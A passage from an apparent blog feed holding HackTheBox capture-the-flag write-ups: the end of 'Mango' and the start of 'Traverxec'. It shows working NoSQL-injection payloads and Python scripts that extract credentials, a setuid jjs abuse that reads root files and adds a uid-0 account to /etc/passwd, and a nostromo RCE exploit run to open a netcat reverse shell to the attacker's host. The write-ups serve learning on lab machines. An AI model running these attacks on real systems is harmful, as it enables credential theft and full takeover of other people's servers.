hole I will skip it.</p><p>So what remain now ? Only <code>http://staging-order.mango.htb</code>. </p><p>Opening it display a classic login page :</p><p><img src="https://user-images.githubusercontent.com/9076747/68054811-7b729180-fcef-11e9-9355-f813b1351cea.png" alt="mango staging order">  </p><p><code>gobuster</code> doesn’t find any other interesting directories or pages so let’s focus on this login page.  </p><p>What do we first try when seeing a login page ? Injection of course!</p><p>After a few blind tries of common injection we don’t get any results. It’s kind of difficult to find the right payload because we don’t have any informations on the backend… </p><p>At this point I felt a bit out of ideas at this point to be honest. Taking a break helped me clear up my mind and think more carefully about the situation.  </p><p>Since we are on <code>hackthebox</code> we know that box name often give tips on what’s going on. So Mango…mango…mongo…mongodb? </p><p>Mongodb might be a nice start to try new techniques on this box. As a reminder:</p><blockquote><p>MongoDB is a cross-platform document-oriented database program. Classified as a NoSQL database program, MongoDB uses JSON-like documents with schema.<br><a href="https://www.mongodb.com/" target="_blank" rel="noopener">https://www.mongodb.com/</a></p></blockquote><p>Mongodb is a NoSQL database software, and, as for SQL, NoSQL can be exploited by injection if input is not properly sanitized.<br>A lot of example are available when searching on google. This <a href="https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html" target="_blank" rel="noopener">blog post</a> gives the following example to bypass a login form:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://target/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line">username[$ne]=test&amp;password[$ne]=test</span><br></pre></td></tr></table></figure><h3 id="NoSQL-Injection"><a href="#NoSQL-Injection" class="headerlink" title="NoSQL Injection"></a>NoSQL Injection</h3><p>Let’s give it a try ! </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">'http://staging-order.mango.htb/'</span> --data <span class="string">"username[<span class="variable">$ne</span>]=test&amp;password[<span class="variable">$ne</span>]=test&amp;login=login"</span> -v</span><br><span class="line">&gt; POST / HTTP/1.1</span><br><span class="line">&gt; Host: staging-order.mango.htb</span><br><span class="line">&gt; Content-Length: 49</span><br><span class="line">&gt; Content-Type: application/x-www-form-urlencoded</span><br><span class="line">&lt; HTTP/1.1 302 Found</span><br><span class="line">&lt; Date: Sat, 02 Nov 2019 20:56:09 GMT</span><br><span class="line">&lt; Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">&lt; location: home.php</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>This time we got a <code>302 Found</code>! Seems like the injection succeed and bypassed the login form. Let’s relaunch the request with <code>-L</code> flag to prevent <code>curl</code> from redirecting back to the login page:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">'http://staging-order.mango.htb/'</span> --data <span class="string">"username[<span class="variable">$ne</span>]=test&amp;password[<span class="variable">$ne</span>]=test&amp;login=login"</span> -L</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">[...]</span><br><span class="line">&lt;h1&gt;Under Plantation&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;Sorry <span class="keyword">for</span> the inconvenience. We just started farming!&lt;/h2&gt;</span><br><span class="line">&lt;h3&gt;To contact us <span class="keyword">in</span> the meantime please email: admin@mango.htb&lt;br /&gt;</span><br><span class="line">We rarely look at our inboxes.&lt;/h3&gt;</span><br><span class="line">&lt;/main&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>Nothing there either… That’s disappointing. But we are definitely on the right track.  </p><h3 id="Blind-NoSQL-data-extract"><a href="#Blind-NoSQL-data-extract" class="headerlink" title="Blind NoSQL data extract"></a>Blind NoSQL data extract</h3><p>Let’s summarize what we knows:</p><ul><li>We can do NoSQL injection.</li><li>Successful injection will return <code>302 Found</code>.</li></ul><p>Those two informations are enough to allow us to blindly extract data from the Mongodb instance. Here is an example :</p><p>Using <a href="https://docs.mongodb.com/manual/reference/operator/query/regex/" target="_blank" rel="noopener"><code>$regex</code></a> we will be able to submit a regex by injection. If the regex have a match the server will return <code>302 Found</code>. This will allows us to extract data.</p><p>For example if sending the following payload<br><code>username[$regex]=^a&amp;password[$ne]=test</code> return:</p><ul><li><code>302 Found</code> means that the regex matched, so username start with a <code>a</code>. </li><li><code>200 OK</code> the regex did not match.</li></ul><p>Following this logic we can try with the next letter with regex <code>^ad</code>, <code>^adm</code>, <code>^admi</code> and <code>^admin</code> and so on until we get full username. You get the idea ? :) </p><p>And once we have the full username we can do the exact same to extract the password.</p><p>Having all of those informations in mind, we can craft a script to do the job for us :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://staging-order.mango.htb"</span></span><br><span class="line"></span><br><span class="line">username = <span class="string">""</span></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line"></span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">"username[$regex]"</span>: <span class="string">"^"</span>+username+c,</span><br><span class="line">            <span class="string">"password[$ne]"</span>: password</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        r = requests.post(url, data=payload, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">            print(<span class="string">f"[+] Found one more char : <span class="subst">&#123;username+c&#125;</span>"</span>)</span><br><span class="line">            username += c</span><br></pre></td></tr></table></figure><p>Let’s try that!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python extract_user.py</span><br><span class="line">[+] Found one more char : a</span><br><span class="line">[+] Found one more char : ad</span><br><span class="line">[+] Found one more char : adm</span><br><span class="line">[+] Found one more char : admi</span><br><span class="line">[+] Found one more char : admin</span><br></pre></td></tr></table></figure><p>So the user account is …. <code>admin</code>. I think we could have guessed it after all.</p><p>Let’s now tweak our script to do the same for extracting passwords: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://staging-order.mango.htb"</span></span><br><span class="line"></span><br><span class="line">username = sys.argv[<span class="number">1</span>]</span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># We skip characters that will be interpreted as regex</span></span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">'*'</span>, <span class="string">'+'</span>, <span class="string">'.'</span>, <span class="string">'?'</span>, <span class="string">'|'</span>, <span class="string">'$'</span>]:</span><br><span class="line">    </span><br><span class="line">            payload = &#123;</span><br><span class="line">                <span class="string">"username"</span>: username,</span><br><span class="line">                <span class="string">"password[$regex]"</span>: <span class="string">"^"</span>+password+c</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            r = requests.post(url, data=payload, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">                print(<span class="string">f"[+] Found one more char : <span class="subst">&#123;password+c&#125;</span>"</span>)</span><br><span class="line">                password += c</span><br></pre></td></tr></table></figure><p>Let’s launch it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python extract_password.py admin</span><br><span class="line">[+] Found one more char : t</span><br><span class="line">[+] Found one more char : t9</span><br><span class="line">[+] Found one more char : t9K</span><br><span class="line">[+] Found one more char : t9Kc</span><br><span class="line">[+] Found one more char : t9KcS</span><br><span class="line">[+] Found one more char : t9KcS3</span><br><span class="line">[+] Found one more char : t9KcS3&gt;</span><br><span class="line">[+] Found one more char : t9KcS3&gt;!</span><br><span class="line">[+] Found one more char : t9KcS3&gt;!0</span><br><span class="line">[+] Found one more char : t9KcS3&gt;!0B</span><br><span class="line">[+] Found one more char : t9KcS3&gt;!0B<span class="comment">#</span></span><br><span class="line">[+] Found one more char : t9KcS3&gt;!0B<span class="comment">#2</span></span><br></pre></td></tr></table></figure><p>While we could have bruteforced the <code>admin</code> username using a wordlist it definitely wouldn’t have been possible for the password. </p><p>We now have a username and a password (<code>admin</code>:<code>t9KcS3&gt;!0B#2</code>). What the first thing we do when we have those kind of informations ? Login to SSH of course:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh admin@mango.htb</span><br><span class="line">admin@mango.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br></pre></td></tr></table></figure><p>Nop doesn’t work.</p><p>Then maybe another user account can be extracted from Mongodb instance, let’s tweak our regex to return an user that is not <code>admin</code>:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- "username[$regex]": "^"+username+c,</span></span><br><span class="line"><span class="addition">+ "username[$regex]": "^(?!admin)"+username+c,</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python extract_user.py</span><br><span class="line">[+] Found one more char : m</span><br><span class="line">[+] Found one more char : ma</span><br><span class="line">[+] Found one more char : man</span><br><span class="line">[+] Found one more char : mang</span><br><span class="line">[+] Found one more char : mango</span><br></pre></td></tr></table></figure><p>We could have guessed this one aswell. Let’s get its password: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python extract_password.py mango</span><br><span class="line">[+] Found one more char : h</span><br><span class="line">[+] Found one more char : h3</span><br><span class="line">[+] Found one more char : h3m</span><br><span class="line">[+] Found one more char : h3mX</span><br><span class="line">[+] Found one more char : h3mXK</span><br><span class="line">[+] Found one more char : h3mXK8</span><br><span class="line">[+] Found one more char : h3mXK8R</span><br><span class="line">[+] Found one more char : h3mXK8Rh</span><br><span class="line">[+] Found one more char : h3mXK8RhU</span><br><span class="line">[+] Found one more char : h3mXK8RhU~</span><br><span class="line">[+] Found one more char : h3mXK8RhU~f</span><br><span class="line">[+] Found one more char : h3mXK8RhU~f&#123;</span><br><span class="line">[+] Found one more char : h3mXK8RhU~f&#123;]</span><br><span class="line">[+] Found one more char : h3mXK8RhU~f&#123;]f</span><br><span class="line">[+] Found one more char : h3mXK8RhU~f&#123;]f5</span><br><span class="line">[+] Found one more char : h3mXK8RhU~f&#123;]f5H</span><br></pre></td></tr></table></figure><p>Alright we have <code>mango</code>:<code>h3mXK8RhU~f{]f5H</code>, let’s try to SSH again:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh mango@mango.htb</span><br><span class="line">mango@mango.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)</span></span><br><span class="line"><span class="string">Last login: Mon Nov  4 09:50:35 2019 from 10.10.15.27</span></span><br><span class="line"><span class="string">mango@mango:~$ id</span></span><br><span class="line"><span class="string">uid=1000(mango) gid=1000(mango) groups=1000(mango)</span></span><br><span class="line"><span class="string">mango@mango:~$ ls -l</span></span><br><span class="line"><span class="string">mango@mango:~$</span></span><br></pre></td></tr></table></figure><p>That’s a good step ahead! Unfortunately no user flag here… </p><h3 id="Pivot-mango-gt-admin"><a href="#Pivot-mango-gt-admin" class="headerlink" title="Pivot mango -&gt; admin"></a>Pivot mango -&gt; admin</h3><p>Let’s do a bit of enumeration:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mango@mango:~$ ls -l /home</span><br><span class="line">drwxr-xr-x 2 admin admin 4096 Nov  4 10:07 admin</span><br><span class="line">drwxr-xr-x 5 mango mango 4096 Nov  4 09:31 mango</span><br><span class="line">mango@mango:~$ ls -l /home/admin</span><br><span class="line">-r-------- 1 admin admin   33 Sep 27 14:29 user.txt</span><br></pre></td></tr></table></figure><p>User <code>admin</code> holds the flag. Let’s try to access it using common method since we probably got its password (<code>t9KcS3&gt;!0B#2</code>):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mango@mango:~$ sudo -u admin cat /home/admin/user.txt</span><br><span class="line">[sudo] password <span class="keyword">for</span> mango:</span><br><span class="line">mango is not <span class="keyword">in</span> the sudoers file.  This incident will be reported.</span><br></pre></td></tr></table></figure><p>Oops, obligatory xkcd</p><p><img src="https://user-images.githubusercontent.com/9076747/68114654-dd511800-fef6-11e9-9f7f-4868af23ac2a.png" alt="incident"></p><p>Maybe the simple <code>su</code> command then ?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mango@mango:~$ su - admin</span><br><span class="line">Password:</span><br><span class="line">$ id</span><br><span class="line">uid=4000000000(admin) gid=1001(admin) groups=1001(admin)</span><br><span class="line">$ bash</span><br><span class="line">admin@mango:/$ cat user.txt</span><br><span class="line">7xxxxxxxxxxxxxxxxxxxxx2</span><br></pre></td></tr></table></figure><p>Alright that was not that hard was it ? Let’s move on to the root flag.</p><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>One of the first I do while doing recon is to search for binaries with setuid bit enabled first. It’s always an easy way to privilege escalation.</p><p>As a reminder:</p><blockquote><p>Binaries with the setuid bit enabled, are being executed as if they were running under the context of the root user. This enables normal (non-privileged) users to use special privileges, like opening sockets. While this seems unnecessary for a normal user, it is actually needed for simple commands like ping.</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin@mango:/$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">[...]</span><br><span class="line">/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs</span><br></pre></td></tr></table></figure><p>This <code>jjs</code>  binary catch my eye because it’s not common to see it having the setuid bit. If you wonder what <code>jjs</code> stands for, it stands for <strong>J</strong>ava <strong>J</strong>ava<strong>S</strong>cript. </p><h3 id="jjs-setuid-exploitation"><a href="#jjs-setuid-exploitation" class="headerlink" title="jjs setuid exploitation"></a>jjs setuid exploitation</h3><p>Let’s search online to see if we can do something with this <code>jjs</code> binary. My favorite resource is <a href="https://gtfobins.github.io/" target="_blank" rel="noopener"><code>GTFOBins</code></a>.</p><blockquote><p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p><p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p></blockquote><p>According to it, <code>jjs</code> could be used to execute commands, read and write file. Sounds incredibly useful for us especially since the setuid is set meaning the command will be ran as <code>root</code>. </p><p>Let’s give it a try to read the <code>root.txt</code> flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">admin@mango:/$ <span class="built_in">echo</span> <span class="string">'var BufferedReader = Java.type("java.io.BufferedReader");</span></span><br><span class="line"><span class="string">&gt; var FileReader = Java.type("java.io.FileReader");</span></span><br><span class="line"><span class="string">&gt; var br = new BufferedReader(new FileReader("/root/root.txt"));</span></span><br><span class="line"><span class="string">&gt; while ((line = br.readLine()) != null) &#123; print(line); &#125;'</span> | jjs</span><br><span class="line">Warning: The jjs tool is planned to be removed from a future JDK release</span><br><span class="line">jjs&gt; var BufferedReader = Java.type(<span class="string">"java.io.BufferedReader"</span>);</span><br><span class="line">jjs&gt; var FileReader = Java.type(<span class="string">"java.io.FileReader"</span>);</span><br><span class="line">jjs&gt; var br = new BufferedReader(new FileReader(<span class="string">"/root/root.txt"</span>));</span><br><span class="line">jjs&gt; <span class="keyword">while</span> ((line = br.readLine()) != null) &#123; <span class="built_in">print</span>(line); &#125;</span><br><span class="line">8xxxxxxxxxxxxxxxxxxxxxx5</span><br></pre></td></tr></table></figure><p>So we got the root flag! But this not fun enough right ? It would be better to login as root.</p><p>To do so I am going to show an alternative method from the usual SSH key retrieval/adding I usually use. </p><p>This time we are going to add a new root account to the box by adding a new line to the <code>/etc/passwd</code> file. </p><p>First let’s generate the hash of our password: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin@mango:/$ openssl passwd -1</span><br><span class="line">Password:</span><br><span class="line">Verifying - Password:</span><br><span class="line"><span class="variable">$1</span><span class="variable">$3H6dixbQ</span><span class="variable">$xxxxxxxxxxxxj7TueW</span>/J.</span><br></pre></td></tr></table></figure><p>We are going to add a new user called <code>hg8</code> with the the uid <code>0</code> (to be root) to the <code>passwd</code> file with the following line:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hg8:<span class="variable">$1</span><span class="variable">$3H6dixbQ</span><span class="variable">$xxxxxxxxxxxxj7TueW</span>/J.:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p>Now let’s use the <code>jjs</code> binary to write to <code>/etc/passwd</code> file as root, let’s tweak the example shown on <a href="https://gtfobins.github.io/" target="_blank" rel="noopener"><code>GTFOBins</code></a> to append data to a file instead of creating a new one and let’s go:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">admin@mango:/$ jjs</span><br><span class="line">jjs&gt; var FileWriter = Java.type(<span class="string">"java.io.FileWriter"</span>);</span><br><span class="line">jjs&gt; var fw=new FileWriter(<span class="string">"/etc/passwd"</span>, <span class="literal">true</span>);</span><br><span class="line">jjs&gt; fw.write(<span class="string">"hg8:<span class="variable">$1</span><span class="variable">$3H6dixbQ</span><span class="variable">$xxxxxxxxxxxxj7TueW</span>/J.:0:0:root:/root:/bin/bash\n"</span>);</span><br><span class="line">jjs&gt; fw.close();</span><br><span class="line">jjs&gt; </span><br><span class="line">admin@mango:/home/admin$</span><br></pre></td></tr></table></figure><p>Let’s verify it worked and login as our new user :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin@mango:/$ cat /etc/passwd</span><br><span class="line">[...]</span><br><span class="line">hg8:<span class="variable">$1</span>$/k0hFNSh<span class="variable">$HKqgKcpLRBVVv8bY1wfv3</span>.:0:0:root:/root:/bin/bash</span><br><span class="line">admin@mango:/$ su - hg8</span><br><span class="line">Password:</span><br><span class="line">root@mango:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@mango:~<span class="comment"># cat root.txt</span></span><br><span class="line">8xxxxxxxxxxxxxxxxxxxxxxxxxxx5</span><br></pre></td></tr></table></figure><p>Now that we are root and done let’s not forget to clean up our changes to not spoil other users!</p><hr><p>As always do not hesitate to contact me for any questions or feedbacks ;)</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> gtfobins </tag>
            
            <tag> mango </tag>
            
            <tag> mongodb </tag>
            
            <tag> nosql injection </tag>
            
            <tag> setuid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Traverxec</title>
      <link href="/posts/traverxec/"/>
      <url>/posts/traverxec/</url>
      
        <content type="html"><![CDATA[<img width="581" alt="traverxec-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158714-d03fb900-9889-11ea-865c-4edee3e92884.png"><p>Traverxec was in my opinion a particular and interesting box. While being rated easy it still teach me a little trick and got me very frustrated at some point because it was super easy to overlook and overthink easy things. Still it was worth cogitate on it! </p><p><strong>Tl;Dr:</strong> The user flag was accessible after using a Remote Code Execution exploit on the <code>nhttpd</code> web server running, giving us access to the <code>www-data</code> user. From here you were able to <em>enter</em> the user home directory and access to a backup archive containing its SSH private key. After brute-forcing the passphrase you could connect to the user account and grab the flag.<br>The root flag consisted in exploiting a misconfiguration in <code>sudo</code> config allowing to view <code>journalctl</code> entries as <code>root</code> without password. Since <code>journalctl</code> use <code>less</code> as a pager it was possible to break out from <code>less</code> running as <code>root</code> by spawning an interactive system shell.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.165 traverxec.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC traverxec.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-18 15:36 CET</span><br><span class="line">Nmap scan report <span class="keyword">for</span> traverxec.htb (10.10.10.165)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">80/tcp open  http    nostromo 1.9.6</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>We have something super classical: A HTTP (port 80) and SSH (port 22) service open.  </p><p>But in this result something immediately catch the eye : <code>nostromo 1.9.6</code>. That’s a really not common web server.  </p><p>According to its <a href="https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd" target="_blank" rel="noopener">documentation</a>: </p><blockquote><p>nhttpd is a simple, fast and secure HTTP server.  It runs as a single<br>process, handling connections with select(2).</p></blockquote><p>And actually while searching for informations about this web server (out of curiosity) the second result on Google was about a RCE vulnerability through directory transversal on version &lt;= 1.9.6 (<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-16278" target="_blank" rel="noopener">CVE-2019-16278</a>).<br>A bash proof-of-concept is also <a href="https://git.sp0re.sh/sp0re/Nhttpd-exploits" target="_blank" rel="noopener">available</a>. Seems like we don’t need to search any further…  </p><p>Let’s give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ git <span class="built_in">clone</span> https://git.sp0re.sh/sp0re/Nhttpd-exploits.git</span><br><span class="line">Cloning into <span class="string">'Nhttpd-exploits'</span>...</span><br><span class="line">remote: Enumerating objects: 5, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (5/5), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (5/5), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 5 (delta 0), reused 0 (delta 0)</span><br><span class="line">Unpacking objects: 100% (5/5), <span class="keyword">done</span>.</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">cd</span> Nhttpd-exploits</span><br><span class="line">[hg8@archbook ~]$ bash CVE-2019-16278.sh traverxec.htb 80 id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>That was fast!  </p><p><em>Note: Be careful when launching exploit, do not use CVE-2019-16279.sh since it will DoS the box (<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-16279" target="_blank" rel="noopener">CVE-2019-16279</a>)… It was a very hard box to solve because it would constantly get down probably because of people launching the wrong exploit by mistake.</em></p><p>Let’s now use it to open a reverse shell. First we start our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>And launch the exploit :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ bash CVE-2019-16278.sh traverxec.htb 80 <span class="string">"nc -e /bin/sh 10.10.10.10 8585"</span></span><br></pre></td></tr></table></figure><p>We get the connection immediately: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.165:40048</span><br><span class="line">www-data@traverxec:/$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>First thing first let’s see what the user is to locate the <code>user.txt</code> 